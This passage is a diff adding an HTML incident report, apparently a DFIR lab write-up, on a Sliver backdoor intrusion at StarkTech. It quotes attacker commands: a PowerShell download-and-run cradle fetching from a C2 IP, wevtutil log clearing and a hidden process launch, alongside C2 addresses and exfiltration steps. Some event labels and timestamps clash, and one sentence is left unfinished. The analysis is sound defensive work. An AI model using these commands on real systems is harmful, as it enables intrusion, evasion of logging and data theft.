@@ -1,0 +1,1029 @@
+<html><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"/><title>StarkTech Incident Report</title><style>
+/* cspell:disable-file */
+/* webkit printing magic: print all background colors */
+html {
+	-webkit-print-color-adjust: exact;
+}
+* {
+	box-sizing: border-box;
+	-webkit-print-color-adjust: exact;
+}
+
+html,
+body {
+	margin: 0;
+	padding: 0;
+}
+@media only screen {
+	body {
+		margin: 2em auto;
+		max-width: 900px;
+		color: rgb(55, 53, 47);
+	}
+}
+
+body {
+	line-height: 1.5;
+	white-space: pre-wrap;
+}
+
+a,
+a.visited {
+	color: inherit;
+	text-decoration: underline;
+}
+
+.pdf-relative-link-path {
+	font-size: 80%;
+	color: #444;
+}
+
+h1,
+h2,
+h3 {
+	letter-spacing: -0.01em;
+	line-height: 1.2;
+	font-weight: 600;
+	margin-bottom: 0;
+}
+
+.page-title {
+	font-size: 2.5rem;
+	font-weight: 700;
+	margin-top: 0;
+	margin-bottom: 0.75em;
+}
+
+h1 {
+	font-size: 1.875rem;
+	margin-top: 1.875rem;
+}
+
+h2 {
+	font-size: 1.5rem;
+	margin-top: 1.5rem;
+}
+
+h3 {
+	font-size: 1.25rem;
+	margin-top: 1.25rem;
+}
+
+.source {
+	border: 1px solid #ddd;
+	border-radius: 3px;
+	padding: 1.5em;
+	word-break: break-all;
+}
+
+.callout {
+	border-radius: 3px;
+	padding: 1rem;
+}
+
+figure {
+	margin: 1.25em 0;
+	page-break-inside: avoid;
+}
+
+figcaption {
+	opacity: 0.5;
+	font-size: 85%;
+	margin-top: 0.5em;
+}
+
+mark {
+	background-color: transparent;
+}
+
+.indented {
+	padding-left: 1.5em;
+}
+
+hr {
+	background: transparent;
+	display: block;
+	width: 100%;
+	height: 1px;
+	visibility: visible;
+	border: none;
+	border-bottom: 1px solid rgba(55, 53, 47, 0.09);
+}
+
+img {
+	max-width: 100%;
+}
+
+@media only print {
+	img {
+		max-height: 100vh;
+		object-fit: contain;
+	}
+}
+
+@page {
+	margin: 1in;
+}
+
+.collection-content {
+	font-size: 0.875rem;
+}
+
+.column-list {
+	display: flex;
+	justify-content: space-between;
+}
+
+.column {
+	padding: 0 1em;
+}
+
+.column:first-child {
+	padding-left: 0;
+}
+
+.column:last-child {
+	padding-right: 0;
+}
+
+.table_of_contents-item {
+	display: block;
+	font-size: 0.875rem;
+	line-height: 1.3;
+	padding: 0.125rem;
+}
+
+.table_of_contents-indent-1 {
+	margin-left: 1.5rem;
+}
+
+.table_of_contents-indent-2 {
+	margin-left: 3rem;
+}
+
+.table_of_contents-indent-3 {
+	margin-left: 4.5rem;
+}
+
+.table_of_contents-link {
+	text-decoration: none;
+	opacity: 0.7;
+	border-bottom: 1px solid rgba(55, 53, 47, 0.18);
+}
+
+table,
+th,
+td {
+	border: 1px solid rgba(55, 53, 47, 0.09);
+	border-collapse: collapse;
+}
+
+table {
+	border-left: none;
+	border-right: none;
+}
+
+th,
+td {
+	font-weight: normal;
+	padding: 0.25em 0.5em;
+	line-height: 1.5;
+	min-height: 1.5em;
+	text-align: left;
+}
+
+th {
+	color: rgba(55, 53, 47, 0.6);
+}
+
+ol,
+ul {
+	margin: 0;
+	margin-block-start: 0.6em;
+	margin-block-end: 0.6em;
+}
+
+li > ol:first-child,
+li > ul:first-child {
+	margin-block-start: 0.6em;
+}
+
+ul > li {
+	list-style: disc;
+}
+
+ul.to-do-list {
+	padding-inline-start: 0;
+}
+
+ul.to-do-list > li {
+	list-style: none;
+}
+
+.to-do-children-checked {
+	text-decoration: line-through;
+	opacity: 0.375;
+}
+
+ul.toggle > li {
+	list-style: none;
+}
+
+ul {
+	padding-inline-start: 1.7em;
+}
+
+ul > li {
+	padding-left: 0.1em;
+}
+
+ol {
+	padding-inline-start: 1.6em;
+}
+
+ol > li {
+	padding-left: 0.2em;
+}
+
+.mono ol {
+	padding-inline-start: 2em;
+}
+
+.mono ol > li {
+	text-indent: -0.4em;
+}
+
+.toggle {
+	padding-inline-start: 0em;
+	list-style-type: none;
+}
+
+/* Indent toggle children */
+.toggle > li > details {
+	padding-left: 1.7em;
+}
+
+.toggle > li > details > summary {
+	margin-left: -1.1em;
+}
+
+.selected-value {
+	display: inline-block;
+	padding: 0 0.5em;
+	background: rgba(206, 205, 202, 0.5);
+	border-radius: 3px;
+	margin-right: 0.5em;
+	margin-top: 0.3em;
+	margin-bottom: 0.3em;
+	white-space: nowrap;
+}
+
+.collection-title {
+	display: inline-block;
+	margin-right: 1em;
+}
+
+.page-description {
+	margin-bottom: 2em;
+}
+
+.simple-table {
+	margin-top: 1em;
+	font-size: 0.875rem;
+	empty-cells: show;
+}
+.simple-table td {
+	height: 29px;
+	min-width: 120px;
+}
+
+.simple-table th {
+	height: 29px;
+	min-width: 120px;
+}
+
+.simple-table-header-color {
+	background: rgb(247, 246, 243);
+	color: black;
+}
+.simple-table-header {
+	font-weight: 500;
+}
+
+time {
+	opacity: 0.5;
+}
+
+.icon {
+	display: inline-block;
+	max-width: 1.2em;
+	max-height: 1.2em;
+	text-decoration: none;
+	vertical-align: text-bottom;
+	margin-right: 0.5em;
+}
+
+img.icon {
+	border-radius: 3px;
+}
+
+.user-icon {
+	width: 1.5em;
+	height: 1.5em;
+	border-radius: 100%;
+	margin-right: 0.5rem;
+}
+
+.user-icon-inner {
+	font-size: 0.8em;
+}
+
+.text-icon {
+	border: 1px solid #000;
+	text-align: center;
+}
+
+.page-cover-image {
+	display: block;
+	object-fit: cover;
+	width: 100%;
+	max-height: 30vh;
+}
+
+.page-header-icon {
+	font-size: 3rem;
+	margin-bottom: 1rem;
+}
+
+.page-header-icon-with-cover {
+	margin-top: -0.72em;
+	margin-left: 0.07em;
+}
+
+.page-header-icon img {
+	border-radius: 3px;
+}
+
+.link-to-page {
+	margin: 1em 0;
+	padding: 0;
+	border: none;
+	font-weight: 500;
+}
+
+p > .user {
+	opacity: 0.5;
+}
+
+td > .user,
+td > time {
+	white-space: nowrap;
+}
+
+input[type="checkbox"] {
+	transform: scale(1.5);
+	margin-right: 0.6em;
+	vertical-align: middle;
+}
+
+p {
+	margin-top: 0.5em;
+	margin-bottom: 0.5em;
+}
+
+.image {
+	border: none;
+	margin: 1.5em 0;
+	padding: 0;
+	border-radius: 0;
+	text-align: center;
+}
+
+.code,
+code {
+	background: rgba(135, 131, 120, 0.15);
+	border-radius: 3px;
+	padding: 0.2em 0.4em;
+	border-radius: 3px;
+	font-size: 85%;
+	tab-size: 2;
+}
+
+code {
+	color: #eb5757;
+}
+
+.code {
+	padding: 1.5em 1em;
+}
+
+.code-wrap {
+	white-space: pre-wrap;
+	word-break: break-all;
+}
+
+.code > code {
+	background: none;
+	padding: 0;
+	font-size: 100%;
+	color: inherit;
+}
+
+blockquote {
+	font-size: 1.25em;
+	margin: 1em 0;
+	padding-left: 1em;
+	border-left: 3px solid rgb(55, 53, 47);
+}
+
+.bookmark {
+	text-decoration: none;
+	max-height: 8em;
+	padding: 0;
+	display: flex;
+	width: 100%;
+	align-items: stretch;
+}
+
+.bookmark-title {
+	font-size: 0.85em;
+	overflow: hidden;
+	text-overflow: ellipsis;
+	height: 1.75em;
+	white-space: nowrap;
+}
+
+.bookmark-text {
+	display: flex;
+	flex-direction: column;
+}
+
+.bookmark-info {
+	flex: 4 1 180px;
+	padding: 12px 14px 14px;
+	display: flex;
+	flex-direction: column;
+	justify-content: space-between;
+}
+
+.bookmark-image {
+	width: 33%;
+	flex: 1 1 180px;
+	display: block;
+	position: relative;
+	object-fit: cover;
+	border-radius: 1px;
+}
+
+.bookmark-description {
+	color: rgba(55, 53, 47, 0.6);
+	font-size: 0.75em;
+	overflow: hidden;
+	max-height: 4.5em;
+	word-break: break-word;
+}
+
+.bookmark-href {
+	font-size: 0.75em;
+	margin-top: 0.25em;
+}
+
+.sans { font-family: ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol"; }
+.code { font-family: "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace; }
+.serif { font-family: Lyon-Text, Georgia, ui-serif, serif; }
+.mono { font-family: iawriter-mono, Nitti, Menlo, Courier, monospace; }
+.pdf .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK JP'; }
+.pdf:lang(zh-CN) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK SC'; }
+.pdf:lang(zh-TW) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK TC'; }
+.pdf:lang(ko-KR) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK KR'; }
+.pdf .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
+.pdf:lang(zh-CN) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
+.pdf:lang(zh-TW) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
+.pdf:lang(ko-KR) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
+.pdf .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK JP'; }
+.pdf:lang(zh-CN) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK SC'; }
+.pdf:lang(zh-TW) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK TC'; }
+.pdf:lang(ko-KR) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK KR'; }
+.pdf .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
+.pdf:lang(zh-CN) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
+.pdf:lang(zh-TW) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
+.pdf:lang(ko-KR) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
+.highlight-default {
+	color: rgba(50, 48, 44, 1);
+}
+.highlight-gray {
+	color: rgba(115, 114, 110, 1);
+	fill: rgba(115, 114, 110, 1);
+}
+.highlight-brown {
+	color: rgba(159, 107, 83, 1);
+	fill: rgba(159, 107, 83, 1);
+}
+.highlight-orange {
+	color: rgba(217, 115, 13, 1);
+	fill: rgba(217, 115, 13, 1);
+}
+.highlight-yellow {
+	color: rgba(203, 145, 47, 1);
+	fill: rgba(203, 145, 47, 1);
+}
+.highlight-teal {
+	color: rgba(68, 131, 97, 1);
+	fill: rgba(68, 131, 97, 1);
+}
+.highlight-blue {
+	color: rgba(51, 126, 169, 1);
+	fill: rgba(51, 126, 169, 1);
+}
+.highlight-purple {
+	color: rgba(144, 101, 176, 1);
+	fill: rgba(144, 101, 176, 1);
+}
+.highlight-pink {
+	color: rgba(193, 76, 138, 1);
+	fill: rgba(193, 76, 138, 1);
+}
+.highlight-red {
+	color: rgba(205, 60, 58, 1);
+	fill: rgba(205, 60, 58, 1);
+}
+.highlight-default_background {
+	color: rgba(50, 48, 44, 1);
+}
+.highlight-gray_background {
+	background: rgba(248, 248, 247, 1);
+}
+.highlight-brown_background {
+	background: rgba(244, 238, 238, 1);
+}
+.highlight-orange_background {
+	background: rgba(251, 236, 221, 1);
+}
+.highlight-yellow_background {
+	background: rgba(251, 243, 219, 1);
+}
+.highlight-teal_background {
+	background: rgba(237, 243, 236, 1);
+}
+.highlight-blue_background {
+	background: rgba(231, 243, 248, 1);
+}
+.highlight-purple_background {
+	background: rgba(248, 243, 252, 1);
+}
+.highlight-pink_background {
+	background: rgba(252, 241, 246, 1);
+}
+.highlight-red_background {
+	background: rgba(253, 235, 236, 1);
+}
+.block-color-default {
+	color: inherit;
+	fill: inherit;
+}
+.block-color-gray {
+	color: rgba(115, 114, 110, 1);
+	fill: rgba(115, 114, 110, 1);
+}
+.block-color-brown {
+	color: rgba(159, 107, 83, 1);
+	fill: rgba(159, 107, 83, 1);
+}
+.block-color-orange {
+	color: rgba(217, 115, 13, 1);
+	fill: rgba(217, 115, 13, 1);
+}
+.block-color-yellow {
+	color: rgba(203, 145, 47, 1);
+	fill: rgba(203, 145, 47, 1);
+}
+.block-color-teal {
+	color: rgba(68, 131, 97, 1);
+	fill: rgba(68, 131, 97, 1);
+}
+.block-color-blue {
+	color: rgba(51, 126, 169, 1);
+	fill: rgba(51, 126, 169, 1);
+}
+.block-color-purple {
+	color: rgba(144, 101, 176, 1);
+	fill: rgba(144, 101, 176, 1);
+}
+.block-color-pink {
+	color: rgba(193, 76, 138, 1);
+	fill: rgba(193, 76, 138, 1);
+}
+.block-color-red {
+	color: rgba(205, 60, 58, 1);
+	fill: rgba(205, 60, 58, 1);
+}
+.block-color-default_background {
+	color: inherit;
+	fill: inherit;
+}
+.block-color-gray_background {
+	background: rgba(248, 248, 247, 1);
+}
+.block-color-brown_background {
+	background: rgba(244, 238, 238, 1);
+}
+.block-color-orange_background {
+	background: rgba(251, 236, 221, 1);
+}
+.block-color-yellow_background {
+	background: rgba(251, 243, 219, 1);
+}
+.block-color-teal_background {
+	background: rgba(237, 243, 236, 1);
+}
+.block-color-blue_background {
+	background: rgba(231, 243, 248, 1);
+}
+.block-color-purple_background {
+	background: rgba(248, 243, 252, 1);
+}
+.block-color-pink_background {
+	background: rgba(252, 241, 246, 1);
+}
+.block-color-red_background {
+	background: rgba(253, 235, 236, 1);
+}
+.select-value-color-uiBlue { background-color: undefined; }
+.select-value-color-pink { background-color: rgba(225, 136, 179, 0.27); }
+.select-value-color-purple { background-color: rgba(168, 129, 197, 0.27); }
+.select-value-color-green { background-color: rgba(123, 183, 129, 0.27); }
+.select-value-color-gray { background-color: rgba(84, 72, 49, 0.15); }
+.select-value-color-translucentGray { background-color: undefined; }
+.select-value-color-orange { background-color: rgba(224, 124, 57, 0.27); }
+.select-value-color-brown { background-color: rgba(210, 162, 141, 0.35); }
+.select-value-color-red { background-color: rgba(244, 171, 159, 0.4); }
+.select-value-color-yellow { background-color: rgba(236, 191, 66, 0.39); }
+.select-value-color-blue { background-color: rgba(93, 165, 206, 0.27); }
+.select-value-color-pageGlass { background-color: undefined; }
+.select-value-color-washGlass { background-color: undefined; }
+
+.checkbox {
+	display: inline-flex;
+	vertical-align: text-bottom;
+	width: 16;
+	height: 16;
+	background-size: 16px;
+	margin-left: 2px;
+	margin-right: 5px;
+}
+
+.checkbox-on {
+	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20width%3D%2216%22%20height%3D%2216%22%20fill%3D%22%2358A9D7%22%2F%3E%0A%3Cpath%20d%3D%22M6.71429%2012.2852L14%204.9995L12.7143%203.71436L6.71429%209.71378L3.28571%206.2831L2%207.57092L6.71429%2012.2852Z%22%20fill%3D%22white%22%2F%3E%0A%3C%2Fsvg%3E");
+}
+
+.checkbox-off {
+	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20x%3D%220.75%22%20y%3D%220.75%22%20width%3D%2214.5%22%20height%3D%2214.5%22%20fill%3D%22white%22%20stroke%3D%22%2336352F%22%20stroke-width%3D%221.5%22%2F%3E%0A%3C%2Fsvg%3E");
+}
+	
+</style></head><body><article id="1dab727b-1373-804e-b103-cf7d2c5c8702" class="page sans"><header><img class="page-cover-image" src="the_dfir_report_cover.jpeg" style="object-position:center 50%"/><div class="page-header-icon page-header-icon-with-cover"><img class="icon" src="old_logo-removebg-preview.6732b3890396d5.55377705.png"/></div><h1 class="page-title">StarkTech Incident Report</h1><p class="page-description"></p></header><div class="page-body"><h2 id="1dab727b-1373-8029-80bd-cb165bf18253" class="">Key Takeaways</h2><ul id="1dab727b-1373-80b5-acef-d9c89add946e" class="bulleted-list"><li style="list-style-type:disc"><strong>Initial compromise on DESKTOP6</strong> via a paste․sh PowerShell one‑liner that downloaded and executed <strong>iexploreplugin.exe</strong> from <code>34.29.169.45:8883</code>, then immediately wiped Sysmon, StorageMgmt, and SMSS logs.</li></ul><ul id="1dab727b-1373-8050-b3f8-f58252c419e7" class="bulleted-list"><li style="list-style-type:disc"><strong>Robust persistence &amp; remote access</strong> through AteraAgentServiceWatchdog tasks, Splashtop Streamer and AnyDesk services, an <code>iexplore.lnk</code> shortcut in <code>%Public%</code>, and an IFEO hijack for the backdoor binary.</li></ul><ul id="1dab727b-1373-8031-9045-db7d977258c8" class="bulleted-list"><li style="list-style-type:disc"><strong>Dual C2 channels</strong>: a raw Sliver stream to <strong>35.226.173.183:8000</strong> and a ChaCha20‑encrypted HTTPS beacon to <strong>agegamepay.com:8443</strong> (Basic‑Auth <code>testuser:Sup3rP4ss!</code>); fallback MQTT‑TLS to <strong>34.29.169.45:8883</strong>.</li></ul><ul id="1dab727b-1373-8014-a4fa-dab0d9bb42bb" class="bulleted-list"><li style="list-style-type:disc"><strong>Data theft</strong>: 63 MB Teams archive and AD logs exfiltrated with <strong>rclone 1.69.1</strong>, also copied into a MegaCMD mount <code>%ProgramData%\Microsoft\Teams\mega:V1A</code>, then deleted (Recycle‑Bin log at 27 Mar 22:27).</li></ul><ul id="1dab727b-1373-80a2-b830-fa3b5bd766e1" class="bulleted-list"><li style="list-style-type:disc"><strong>Multi‑hop lateral movement</strong>: WMI Exec to <strong>FILES5</strong>, RDP/SMB to <strong>DC1</strong>, PowerShell Remoting to <strong>BACKUP3</strong>, and a Splashtop GUI session into <strong>DC2</strong>—no ransomware executed.</li></ul><hr id="1dab727b-1373-8083-924c-dd1b945e398b"/><h2 id="1dab727b-1373-80a8-860c-e1b8a2c9a6a8" class="">Case Summary</h2><p id="1dab727b-1373-8094-96ab-d29e63db7a96" class=""><strong>25 Mar 2025 17:28 UTC</strong> – USER <strong>T.Leon</strong> on <strong>DESKTOP6</strong> browsed to a <strong>paste․sh</strong> URL </p><p id="1dab727b-1373-80c2-9673-ca5d9676dc53" class="">This fetched a Sliver backdoor (<code>iexploreplugin.exe</code>) and executed it under <strong>Explorer</strong>. The operator then immediately ran:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="1dab727b-1373-803e-8348-c2398bab83b5" class="code"><code class="language-PowerShell">wevtutil cl Microsoft-Windows-Sysmon/Operational
+wevtutil cl Microsoft-Windows-StorageManagement/Operational
+wevtutil cl Microsoft-Windows-Subsys-SMSS/Operational</code></pre><p id="1dab727b-1373-8013-ae42-f5458a04af2c" class=""><strong>17:30</strong> – The AteraAgent MSI, Splashtop Streamer, and AnyDesk client were installed via signed‑binary proxy (<code>msiexec /qn</code>), each running as <strong>SYSTEM</strong> with auto‑restart tasks and services.</p><p id="1dab727b-1373-808a-9a74-f587b0a6fb57" class=""><strong>17:50</strong> – Through Atera’s shell, an <strong>Impacket WMI Exec</strong> call created a hidden PowerShell on <strong>FILES5</strong>, downloading <code>python.zip</code> from the same C2. Defender flagged it (Event 1116) but was disabled with:</p><p id="1dab727b-1373-8040-9ba8-d77b6e2884c8" class=""><strong>18:04</strong> – <code>Expand-Archive python.zip</code>, then <code>pythonw.exe testc.py</code> side‑loaded <code>python311.dll</code>, dropped <code>ws2_32.py</code> and <code>system_module.py</code>, and opened two C2 channels.</p><p id="1dab727b-1373-8067-a015-e359f86a31d8" class=""><strong>18:13–18:18</strong> – Data was compressed (<code>Compress-Archive</code>) into <code>teams-starktech.zip</code> (63 MB) and <code>adbuild.zip</code>, exfiltrated via <strong>rclone</strong> to an external bucket, and copied to <strong>MegaCMD</strong> at <code>%ProgramData%\Microsoft\Teams\mega:V1A</code>.</p><p id="1dab727b-1373-800a-8c17-d322c13d49ed" class=""><strong>26 Mar</strong> – The actor RDP’d into <strong>FILES5</strong> (Event 1149), performed an SMB logon (4624 Type 3), and at <strong>20:51</strong> used PowerShell remoting (<code>Invoke-Command -AsJob</code>) to run <code>\\DC1\Deploy\script.ps1</code> on <strong>BACKUP3</strong> (Timeline 909983). That script would have fetched an encryption module (<code>encrypt.psm</code>) but IR intervened before it ran.</p><p id="1dab727b-1373-809e-838d-d77f8d5918e9" class=""><strong>27 Mar 02:15</strong> – A Splashtop GUI session from <strong>DESKTOP6</strong> to <strong>DC2</strong> was recorded, after which all C2 channels were severed and the compromised hosts isolated—no encryption occurred.</p><hr id="1dab727b-1373-8007-a11d-c5e9caba93b2"/><h2 id="1dab727b-1373-80f7-a79d-ec5150549fa8" class="">Initial Access <br/><br/></h2><table id="1dab727b-1373-8042-9979-c75c28299b79" class="simple-table"><tbody><tr id="1dab727b-1373-80b4-aa10-fd225ba67d10"><td id="qfP&gt;" class="">Time</td><td id="ig&gt;b" class="">Host</td><td id="=A{?" class="">Source</td><td id="cj`D" class="">Command</td><td id="upQY" class="">Artifact</td></tr><tr id="1dab727b-1373-80e7-a88e-f920e80f761c"><td id="qfP&gt;" class="">25 Mar 17:27:44</td><td id="ig&gt;b" class="">DESKTOP6</td><td id="=A{?" class="">PowerShell 4103</td><td id="cj`D" class=""><code>Invoke-WebRequest http://34.29.169.45:8883/iexploreplugin.exe -OutFile $env:TEMP\iexploreplugin.exe</code></td><td id="upQY" class=""><code>%TEMP%\iexploreplugin.exe</code> downloaded</td></tr><tr id="1dab727b-1373-80ba-b055-e2936a967cd1"><td id="qfP&gt;" class="">25 Mar 17:29:01</td><td id="ig&gt;b" class="">DESKTOP6</td><td id="=A{?" class="">Sysmon 4688</td><td id="cj`D" class=""><code>iexplore.exe</code> → <code>%TEMP%\iexploreplugin.exe</code></td><td id="upQY" class="">Sliver backdoor executed<br/><br/>Execution (T1059.001 / T1204.002)<br/></td></tr></tbody></table><p id="1dbb727b-1373-803c-a71f-e31c8ebca6c1" class=""><strong>Paste.sh Cradle</strong>: The actor hosted a PS script on paste.sh that used <code>Invoke-WebRequest</code> to download <code>iexploreplugin.exe</code> from their C2 (<code>34.29.169.45:8883</code>) directly to the user’s <code>%TEMP%</code> folder. By chaining this through Explorer, they bypassed app whitelisting and used Masquerading to blend with normal browser activity.</p><figure id="1dbb727b-1373-8058-ac17-ee2166527b8d" class="image"><a href="Screen_Shot_2025-04-20_at_7.24.53_PM.png"><img style="width:2708px" src="Screen_Shot_2025-04-20_at_7.24.53_PM.png"/></a></figure><hr id="1dab727b-1373-80dd-8758-f6ad2bfe20b9"/><h2 id="1dbb727b-1373-80a8-ad40-d23939f29cbf" class="">Execution</h2><table id="1dbb727b-1373-809d-b42c-ca0d0c07c8a8" class="simple-table"><tbody><tr id="1dbb727b-1373-801f-987a-def3a27ab385"><td id="~LNS" class="">Time</td><td id="NxYC" class="">Host</td><td id="fSFj" class="">Source</td><td id="]ALu" class="">Command / Binary</td><td id="N&gt;~z" class="">Artifact</td><td id="nwLl" class=""></td></tr><tr id="1dbb727b-1373-80cc-85fe-f164bb0405b4"><td id="~LNS" class="">17:29:05</td><td id="NxYC" class="">DESKTOP6</td><td id="fSFj" class="">Sysmon 4688</td><td id="]ALu" class=""><code>Start-Process %TEMP%\iexploreplugin.exe -WindowStyle Hidden</code></td><td id="N&gt;~z" class="">Sliver payload</td><td id="nwLl" class=""></td></tr><tr id="1dbb727b-1373-807b-b0b5-e08b2724bf2f"><td id="~LNS" class="">18:04:49</td><td id="NxYC" class="">FILES5</td><td id="fSFj" class="">PowerShell 4104</td><td id="]ALu" class=""><code>C:\ProgramData\python\pythonw.exe testc.py</code></td><td id="N&gt;~z" class="">Python stager</td><td id="nwLl" class=""></td></tr><tr id="1dbb727b-1373-80c6-bb9e-f4b7db447d27"><td id="~LNS" class="">18:04:50</td><td id="NxYC" class="">FILES5</td><td id="fSFj" class="">Sysmon 7</td><td id="]ALu" class=""><code>pythonw.exe</code> side-loaded <code>python311.dll</code></td><td id="N&gt;~z" class="">DLL side-loading</td><td id="nwLl" class=""></td></tr><tr id="1dbb727b-1373-8098-8523-e1187d3549be"><td id="~LNS" class="">26 Mar 20:48:34</td><td id="NxYC" class="">DC1</td><td id="fSFj" class="">powershell</td><td id="]ALu" class="">PowerShell 4104 downloads <code>script.ps1</code> &amp; <code>crypto.psm1</code></td><td id="N&gt;~z" class="">log</td><td id="nwLl" class=""></td></tr></tbody></table><ul id="1dbb727b-1373-80c7-9026-f0ccabafc96a" class="bulleted-list"><li style="list-style-type:disc"><strong>Hidden Launch</strong>: <code>iexploreplugin.exe</code> was executed silently with <code>Start-Process -WindowStyle Hidden</code>.<br/><br/></li></ul><figure id="1dbb727b-1373-809e-be10-c6daf8577026" class="image"><a href="Screen_Shot_2025-04-20_at_7.51.23_PM.png"><img style="width:2260px" src="Screen_Shot_2025-04-20_at_7.51.23_PM.png"/></a></figure><p id="1dbb727b-1373-80ce-b914-d6011a07435b" class=""><strong><br/><br/></strong></p><figure id="1dbb727b-1373-80a9-bf43-f1e31216e3d1" class="image"><a href="Screen_Shot_2025-04-20_at_7.49.29_PM.png"><img style="width:2762px" src="Screen_Shot_2025-04-20_at_7.49.29_PM.png"/></a></figure><p id="1dbb727b-1373-80f2-882e-ca1793137bca" class=""><strong>from powershell history for user(</strong><code><strong>t.leon</strong></code><strong>)</strong></p><figure id="1dbb727b-1373-80d1-bdb0-e9377a905186" class="image"><a href="Screen_Shot_2025-04-20_at_7.54.14_PM.png"><img style="width:986.984375px" src="Screen_Shot_2025-04-20_at_7.54.14_PM.png"/></a></figure><p id="1dbb727b-1373-809f-86dc-f6609a75491c" class=""><strong><br/><br/>Signed Proxy<br/></strong>: AteraAgent, Splashtop, and AnyDesk were installed via signed <code>msiexec.exe</code> to avoid script/PS detection.<br/><br/></p><ul id="1dbb727b-1373-80b8-814d-dee772914757" class="bulleted-list"><li style="list-style-type:disc"><strong>In‑Memory Loader</strong>: On FILES5, <code>pythonw.exe testc.py</code> loaded <code>python311.dll</code> from memory, running Sliver code without touching disk with T1574.002 (DLL Side-Loading).</li></ul><figure id="1dbb727b-1373-8009-8437-f483a082b397" class="image"><a href="Screen_Shot_2025-04-20_at_6.36.56_PM.png"><img style="width:986.9921875px" src="Screen_Shot_2025-04-20_at_6.36.56_PM.png"/></a></figure><p id="1dbb727b-1373-80ae-b6a5-ccd6720a9def" class=""><strong><br/><br/></strong></p><p id="1dbb727b-1373-80c0-ab8d-db3fb89a1048" class="">On <strong>March 26, 2025, at 10:48:34 PM UTC</strong>, a PowerShell script (Event ID <strong>4104</strong>) executed on <strong>dc1.starktech.local</strong> by user <strong>S-1-5-21-2155630702-889811512-934696947-1000</strong>, downloading two suspicious files (<code>script.ps1</code> and <code>crypto.psm1</code>) from <strong>GitHub Gist</strong> via <code>Invoke-WebRequest</code>, indicating potential C2 activity or malware deployment on a critical Domain Controller.</p><p id="1dbb727b-1373-8025-be0c-c0b423c21f42" class=""><strong>Key Details:</strong></p><ul id="1dbb727b-1373-80de-870e-e76ba02229a9" class="bulleted-list"><li style="list-style-type:disc"><strong>Script Block:</strong> Downloaded files from <code>gist.githubusercontent.com/tsale/...</code> (abused Gist hosting).</li></ul><ul 